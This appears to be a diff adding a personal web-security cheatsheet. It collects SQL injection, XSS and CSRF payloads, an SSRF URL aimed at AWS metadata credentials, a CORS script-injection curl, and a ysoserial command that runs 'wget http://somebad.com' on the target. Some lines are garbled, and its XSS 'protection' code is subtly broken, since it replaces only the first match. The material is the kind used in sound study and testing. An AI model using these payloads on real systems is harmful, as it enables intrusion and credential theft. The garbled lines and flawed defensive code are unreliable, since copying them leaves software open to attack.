@@ -1,0 +1,657 @@
+# Web APIs and MicroServices <br>  *Notes and Cheatsheet Stuff*
+
+## Header Inspection: 
+
+#### Tools HTTP / Burp / Wireshark
+
+Inspecting is pretty straightforward for HTTP Headers, use common tools
+
+Burp/Curl/Wireshark 
+
+Can find examples for SSRF and AWS manipulation pretty easily.
+
+- [ ] Simple Intercepts, Wireshark Follow, Retrieve Header Stuff
+- [ ] Retrieve Auth Token Transmitted to Client Insecurely
+    
+        curl -iX PUT http://lab-1.2.site.labs/authservice/index.php
+
+- [ ] "Spoof" Request
+
+        curl -H 'Cache-Control: max-age=0' \
+        -H 'Upgrade-Insecure-Requests: 1' \
+        -H 'Origin: http://lab-1.2.site.labs' \
+        -H 'ata focused'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+        -H 'Accept-Encoding: gzip, deflate' \
+        -H 'Accept-Language: en-US,en;q=0.9' \
+        http://{URL}.php | zcat
+
+        Optional instead of zcat:
+        --insecure
+        --compressed
+</hr>
+
+#### SSRF
+
+    GET  /getimage.jsp?url=https://website.com/images/cat.jpg 
+
+#### AWS EC2 Metadata SSRF
+        
+    http://targetsite/abc?internalurl=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2role
+
+</hr>
+
+### SQLi
+
+    SELECT number FROM table WHERE name = '$var'
+    SELECT number FROM table WHERE name = ' ' OR 1 = 1 --'
+
+<h6>
+Form Based Tests and Enumeration:
+<hr>
+</h6>
+
+    ' OR 1=1 -- 
+    ' union select 1,2,3 --
+    ' union select 1,2,3,4,5,6,7 --
+    ' UNION SELECT 1,username,3,password,5,6,7 FROM animalshelter.users -- 
+
+    ' OR 1='1
+<br>
+
+### XSS 
+
+Pretty common to find XSS vulns, testing is pretty well documented and available.
+
+#### - Simple Test
+
+```javascript
+<script>alert(XSS)</script>
+
+'';!--"<XSS>=&{()}
+```
+
+#### - Locater String
+
+```javascript
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,
+83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(
+88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+```
+
+#### - Locater String with case indication marrio from gnucitzen.org
+
+```javascript
+;alert(1)//\';alert(2)//";alert(3)//\";alert(4)//--
+></SCRIPT>">'><SCRIPT>alert(5)</SCRIPT>;=&{<script>alert(6)</script>}106© 2022 Jason Lam© SANS Institute 2022
+```
+
+#### - Protection: Render Functions
+
+```javascript
+{ data: "animalname",
+  // do not allow script tags
+  render: function ( data, type, row ) {
+        data = "<span id="+row.id+">"+data+"</span>";
+        return data.replace('script','s#ript');
+     }
+},
+
+
+render: function ( data, type, row ) {
+          data = "<span id="+row.id+">"+data+"</span>";
+          data=data.replace('<','&lt');
+          return data.replace('>','&gt');
+      }
+```
+
+
+
+# File Content Inspection 
+
+## Unicode Checks
+
+<b>
+  
+- Encoding validation from OS POV
+
+</b>
+
+```bash
+# Check encoding recognized by OS
+file -i $file
+encguess $file
+file -b --mime-encoding
+
+
+# Requires package 'php-mbstring' via apt, yum, dnf, ect.
+php -r "echo 'Checked Content Guess: ' . mb_detect_encoding(file_get_contents('myfile.txt'), 'UTF-8, ASCII, JIS, EUC-JP, SJIS, iso-8859-1') . PHP_EOL;"
+
+# Python
+python -c 'from sys import exit,stdin;exit()if 128>max(character for characters in open(stdin.fileno(),"b") for character in characters) else exit("The file is not ASCII")' < file2check.txt
+
+```
+
+Also, use of Strings, XXD and head may help validate characters and whatnot.
+
+## Multi Extension uploads
+
+Apache Config will help prevent double extensions
+
+```php
+<FilesMatch ".php.$">
+    Order deny, allow
+    Allow from all
+</FilesMatch>
+```
+
+## Misc:
+
+#### Response Splitting
+
+    <? header("Location: http:/site.com/content.php?id=" . $_GET['id'] ); ?>
+    \n\r set-cookie sessiontoken=AABBCCD
+    curl http://site.com/content.php?id=%0d%0aSet-Cookie%3Asessiontoken%3DAABBCC
+
+## Deny Listing 
+
+<br>
+These snippets are not inclusive.  There are other possibilities 
+listed within the attack, method, or topic elseswhere in this cheatsheet,
+or in the notes or other notes.
+<br>
+
+#### General Input Checks 
+
+<br>
+
+These snippets may help Identifiy critical data, for utilization on WAF, Proxy Filters, or any technology that parses in transit or "resting" data.
+
+<hr>
+
+SSN Regex:
+
+- xxx-xxx-xxx    
+
+```perl    
+    ^\d{3}-\d{2}-\d{4}$
+```
+
+3digits '-' 3Digits
+
+- xxx-xxx
+
+```perl
+    ^\d\d\d-\d\d\d$
+```
+<u>
+
+
+Credit Card Check
+
+- Starting numbers and mod10 can to verify digits actually comprise a credit card number
+
+```perl
+^((4\d{3})|(5[1-5]\d{2}))(-?|\040?)(\d{4}(-?|\040?)){3}|^(3[4,7]\d{2})(-?|\040?)\d{6}(-?|\040?)\d{5}
+```
+
+#### Email Addresses
+
+- Matches an email address 
+    - xxx@xxx
+    - TLD sold seperately 
+
+```perl
+^\[A-Z0-9.\_%+-]+@\[A-Z0-9.-]+\\\.\[A-Z]{2,4}$
+```
+
+#### PHP Built in Filter Function
+
+
+#### XSS 
+
+- A good reference to tune out Noise, not possible to deny all xss, whitelisting is more
+suited, but if not possible and "Dutch Dam hole" blocking needs to be done, noise reduction 
+will greatly assist.
+
+
+ ```perl
+ ((\%3C)|<) [^<>/]*(S|s) [^<>/]*(C|c) [^<>/]*(R|r) [^<>/]*((\%3E)|>)
+ ```
+
+#### PATH Traversal
+
+- Generic digits to consider for to prevent traversal of Path / Dirs
+
+```perl
+\ ..  ;  :
+```
+
+#### Response Splitting
+
+- HTTP Resonse Splitting
+
+```txt
+
+\[\r\n]*
+
+# Alternatively, maybe just
+
+\n
+
+```
+
+
+# Web Services
+
+#### WDSL SOAP XML
+
+Check your leaks!
+Be a dork w/ your site!
+Google
+
+``` yaml
+# Generic for quick explaination
+
+google_search:
+
+  site: yoursite.com 
+    filetype: "{{ filetype }}" 
+    inurl: "{{ filetype }}"
+  filetype:
+    - xml
+    - wdsl
+    - ect 
+```
+!-- Maybe worth checking Wayback Cahced Content to see what was Leaked as Well --!
+
+
+
+# cURL GraphQL
+
+
+
+# Random Misc. Things
+
+
+#### TLS Apache Mod_Rewrite Redirection:
+
+```bash
+RewriteCond %{HTTPS} off
+RewriteRule ^secure/.*$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
+```
+
+http://phpstarter.net/2008/07/several-htaccess-mod_rewrite-tricks-to-better-web-application/
+
+
+#### Asp.Net Filters example
+
+Built In functions for asp.net
+
+- RequireFieldValidator
+- RegularExpressionValidator
+- CustomValidator
+- RangeValidator
+- CompareValidator
+
+##### Example: 
+
+```html
+<asp:TextBox id="txtZIP" runat="SERVER">
+</asp:TextBox>
+<asp:RegularExpressionValidator 
+id="txtZIP_validation" runat="SERVER" 
+ControlToValidate="txtZIP" ErrorMessage="Enter a valid US ZIP code." ValidationExpression="\d{5}(-
+\d{4})?">
+</asp:RegularExpressionValidator
+```
+
+#### Password Storage 
+
+Modular Crypt Format
+
+- Basic Hash in file storage
+![mcf](pics/mcf.png)
+
+####  AWS Access Token Enumeration
+
+Shows all the buckets available with the role
+    
+    aws s3api list-buckets
+
+Shows the objects within a bucket
+    
+    aws s3api list-objects --bucket abcbucket
+
+Syncs the data from S3 bucket to local computer
+
+    aws s3 sync s3://abcbucket/ /localdir/
+
+
+
+
+### Requests
+
+#### Example of Java HTTPServletRequest for Session Handling
+
+```java
+// The request is a HTTPServletRequest and comes from 
+// the Java doGet or doPost
+// Pulls session IDed from user incoming requert
+HttpSession session = request.getSession(true);
+// Save a new Java session variable
+session.setAttribute(dataName, dataValue);
+// Retrieve a new session variable
+String value = session.getAttribute(name).toString();
+```
+
+#### XHR Javascript Example: 
+
+```javascript
+//Initiating the XMLHttpRequest object
+var xmlHttp = new XMLHttpRequest();
+//GET method to get the test.txt file
+xmlHttp.open("GET", "test.txt",true);
+//When loading is completed (readyStat=4), display the content with an alert
+xmlhttp.onreadystatechange=function(){
+if (xmlHttp.readyState=4){alert(xmlHttp.getAllResponseHeaders())}
+xmlhttp.send(null)
+```
+
+
+#### Fetch API Example
+
+```javascript
+fetch("http://www.site.org").then(function(respon
+se) { 
+return response.json();
+}).then(function(jsonData) { 
+console.log(jsonData); 
+}).catch(function() { 
+console.log("Error"); 
+});
+```
+
+#### XHR Example for Preflight requests; XHR lvl2 for XDR cross-domain request.
+
+Example Request/Response to an XHR level 2
+or XDR cross-domain request.
+
+```sh
+'#### Request'
+
+GET /resources/public-data/ HTTP/1.1 
+Host: bar.other
+User-Agent: Mozilla/5.0
+Connection: keep-alive 
+Referer: http://foo.example/examples/access-control/simpleXSInvocation.html 
+Origin: http://foo.example
+
+'# Example Request w/ Curl'
+
+curl -XGET \
+-H 'content: HTTP/1.1' \
+-H 'Host: bar.other' \
+-H 'User-Agent: Mozilla/5.0' \ When the request is made to a 
+
+
+##### Response Example
+'
+HTTP/1.1 200 OK
+Date: Mon, 01 Dec 2021 00:23:53 GMT
+Server: Apache/2.0.61
+Access-Control-Allow-Origin: *
+Keepalive: timeout=2, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: application/
+'
+```
+
+#### HTML5 request/response example 
+
+```bash
+
+### Request ###
+
+GET /chat HTTP/1.1 
+Host: server.example.com 
+Upgrade: websocket 
+Connection: Upgrade 
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== 
+Sec-WebSocket-Origin: http://example.com 
+Sec-WebSocket-Protocol: chat, superchat 
+Sec-WebSocket-Version: 13
+
+
+### Response ###
+HTTP/1.1 101 Switching Protocols Upgrade: websocket 
+Connection: Upgrade 
+Sec-WebSocket-Accept: 
+s3pPLMBiTxaQ9kYGzzhZRbK+xOo= 
+Sec-WebSocket-Protocol: chat
+
+```
+
+## CSRF 
+
+Via https://trustfoundry.net/2016/04/03/cross-site-request-forgery-cheat-sheet/
+![CSRF Flow Chart](https://trustfoundry.net/wp-content/uploads/2021/01/CSRF-CheatSheet-v2.3.1.png)
+
+
+### CSRF Request PoCs
+
+From: https://trustfoundry.net/2016/04/03/cross-site-request-forgery-cheat-sheet/
+```javascript
+
+//--HTML GET – Requiring User Interaction for Proof-of-Concept--//
+<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
+//--HTML GET (No User Interaction)--//
+<img src="http://www.example.com/api/setusername?username=CSRFd">
+//--HTML POST – Requiring User Interaction for Proof-of-Concept--//
+<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+<input name="username" type="hidden" value="CSRFd" />
+<input type="submit" value="Submit Request" />
+</form>
+//--HTML POST (AutoSubmit – No User Interaction)--//
+<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&>
+<input name="username" type="hidden" value="CSRFd" />
+<input type="submit" value="Submit Request" />
+</form>
+<script>
+document.getElementById("autosubmit").submit();
+</script>
+//--JSON GET – Simple Request----//
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.send();
+</script>
+//-- JSON POST – Simple Request --//
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.withCredentials = true;
+//application/json is not allowed in a simple request. text/plain is the default
+xhr.setRequestHeader("Content-Type", "text/plain");
+//You will probably want to also try one or both of these
+//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//xhr.setRequestHeader("Content-Type", "multipart/form-data");
+xhr.send('{"role":admin}');
+</script>
+//--  JSON POST – Complex Request --//
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"role":admin}');
+```
+
+
+## HTML5 CSP 
+
+CSP img-src Error Example:
+
+```yaml
+
+document-uri: <url>/site.php
+referrer: <url>
+violated-directive: img-src
+effective-directive: img-src
+original-policy: img-src ...; report-uri <url>
+dispositon: enforce
+blocked-uri: <url>/document.png
+line-number: 78
+source-file: site.url
+status-code: 200
+script-sample: 
+```
+
+## CORS
+### Example Using Curl <br> showing Bypass and Script Injection
+
+```bash
+#FULL URL
+FULLURL="http://somesite.org"
+#Host Field
+HOST="site.org/something.php"
+#Origin Field
+ORIGIN="http://site.org"
+CONTENTTYPE="application/x-www-form-urlencoded"
+USERAGENT="Moxilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.8177.420 Safari/537.36"
+###################################################
+#URL ENCODE THESE AND UPDATE BEFORE TESTING/SENDING
+CSPDATA="img-src site.org"
+CSPDATA2="script-src 'unsafe-inline'"
+CSPDATA3="script-src 'unsafe-inline' 'unsafe-eval'"
+SCRIPTINJECT='<script src="data:application/javascript;charset=utf-8;base64,PHNjcmlwdD5hbGVydChYU1MpPC9zY3JpcHQ+Cg=="></script>'
+####################################################
+curl -s -k -X $"POST" \
+-H $"Host: $HOST" \
+-H $"Cache-Control: max-age=0" \
+-H $"Upgrade-Insecure-Requests: 1" \
+-H $"Origin: $ORIGIN" \
+-H $"Content-Type: $CONTENTTYPE" \
+-H $"User-Agent: $USERAGENT"
+-H $'Accept: *' \
+-H $'Accept-Encoding: *' \
+-H $'Accept-Language: en-US,en;q=0.9' \
+-H $'Connection: close' \
+### What value is the the webserver expecting from the form field?
+--databinary $'{POSTFIELD}='"$CSPDATA" \ 
+$''"$FULLURL"
+```
+
+## Serialization
+
+Upon inspection of headers when altering cookie:
+"Error Occured Decrpyting the stream"
+
+
+ysoserial Java tool
+```bash
+#You will need to chain the commands together and add the payload type eg. 
+java -jar ~/ysoserial-master.jar CommonsCollections1 'command' | base64 -w 0
+#or
+outputHeader=`java -jar ysoserial.jar CommonsCollections1 'touch /tmp/somefile && wget http://somebad.com' | base64 -w 0`
+# Craft a curl or use Burp to Paste as the cookie: $outputHeader 
+```
+
+Inspect the Java Classes.  See how deserialization is happening, and if there are any
+type of validation going on for the data that is being deserialized.
+
+#### Local / Session Storage
+
+Developer tools (Ctrl Shift I / F12)
+Review a few things; 
+1. Network 
+    - [ ] Are unknown requests, Any potential Iframe overlays?
+    - [ ] Any Requests to external sites?
+1.  Application in Dev Tools
+    - [ ] What Vars are being stored, and what does client have access to?
+
+
+## CURL Examples
+</hr>
+
+```bash
+    # To download a file:
+    curl <url>
+    # To download and rename a file:
+    curl <url> -o <outfile>
+    # To download multiple files:
+    curl -O <url> -O <url>
+    # To download all sequentially numbered files (1-24):
+    curl http://example.com/pic[1-24].jpg
+    # To download a file and pass HTTP authentication:
+    curl -u <username>:<password> <url>
+    # To download a file with a proxy:
+    curl -x <proxy-host>:<port> <url>
+    # To download a file over FTP:
+    curl -u <username>:<password> -O ftp://example.com/pub/file.zip
+    # To get an FTP directory listing:
+    curl ftp://username:password@example.com
+    # To resume a previously failed download:
+    curl -C - -o <partial-file> <url>
+    # To fetch only the HTTP headers from a response:
+    curl -I <url>
+    # To fetch your external IP and network info as JSON:
+    curl http://ifconfig.me/all.json
+    # To limit the rate of a download:
+    curl --limit-rate 1000B -O <outfile>
+    # To get your global IP:
+    curl httpbin.org/ip 
+    # To get only the HTTP status code:
+    curl -o /dev/null -w '%{http_code}\n' -s -I URL
+    # Post data:
+    curl -d password=x http://x.com/y
+    # Auth/data:
+    curl -u user:pass -d status="Hello" http://twitter.com/statuses/update.xml
+    # multipart file upload
+    curl -v -include --form key1=value1 --form upload=@localfilename URL
+    # multipart form: send data from text field and upload file
+    curl -F person=anonymous -F secret=@file.txt http://example.com/submit.cgi
+    # Use Curl to Check if a remote resource is available Check-if-file-is-available-with-curl/
+    curl -o /dev/null --silent -Iw "%{http_code} https://example.com/my.remote.tarball.gz"
+    # FTP 
+    curl--user daniel:secret ftp://example.com/download
+    curl ftp://daniel:secret@example.com/download
+    curl --list-only ftp://ftp.example.com/directory/ #Dir Listing
+    # FTP / PUT commands
+    curl -T localfile http://example.com/new/resource/file
+    curl -T localfile ftp://ftp.example.com/dir/path/remote-file
+    curl-T localfile ftp://ftp.example.com/dir/path/ ##### local file as remote
+    curl -T 'image[1-99].jpg' ftp://ftp.example.com/up  load/ #globbing
+    curl -T '{Huey,Dewey,Louie}.jpg' ftp://ftp.example.cm/nephews/ #globbing
+    # Delete FTP file with fail option
+    curl -Q "-*DELE file" -u ftpuser:ftppass ftp://example.com/moo
+    # Curl
+    curl -X POST https://reqbin.com/echo/post/json 
+    -H "Content-Type: application/json" \
+    -d '{"productId": 123456, "quantity": 100}' 
+    # The curl command can be used to interact with with FTP using the following command:
+     curl -u ftpuser:ftppass ftp://127.0.0.1
+    curl -u ftpuser:fts - Basic Storageppass ftp://127.0.0.1/filename1 -Q '-*DELE file1'
+    # FTP download files 
+    curl -u ftpuser:ftppass ftp://127.0.0.1/file -O a.f.b --cookie cookie.txt
+    # enumerate the HTTP server using curl with the following:
+    # -D - specifies that we dump server headers to stdout.
+    curl -D - http://127.0.0.1/ 
+    #   The prior curl command had an HTTP header of Set-Cookie. We can save this to a file using:
+    curl -D - http://127.0.0.1 -c cookie.txt
+    #  JSON
+    curl http://127.0.0.1/cache | python -m json.tool
+    #    We can attempt to POST deleteone=files to delete one file:
+    curl -s http://127.0.0.1/cache --cookie cookie.txt -d deleteone=files
+    #    We get in response: {"data":"Curl Not Allowed","request":false}
+    #    We need to change the useragent string via the following command:
+    curl -s http://127.0.0.1/cache --cookie cookie.txt -d deleteone=files -A "My New User-Agent"
+    for i in seq {1..3834}; do curl -s http://127.0.0.1/cache --cookie cookie.txt -d deleteone=files -A "My New User-Agent"; done
+    # example FTP upload, deletion, and 
+    curl -u ftpuser:ftppass ftp://127.0.0.1/ -Q '-*DELE file1'
+    curl -D - http://127.0.0.1 -c cookie.txt
+    curl -u ftpuser:ftppass -T a.f.b ftp://127.0.0.1/upload --cookie cookie.txt -v
+    for i in seq {1..3834}; do curl -s http://127.0.0.1/cache --cookie cookie.txt -d deleteone=files -A "My New User-Agent"; done
+    curl -F param=@'./file' http://127.0.0.1/upload --cookie cookie.txt 
+```
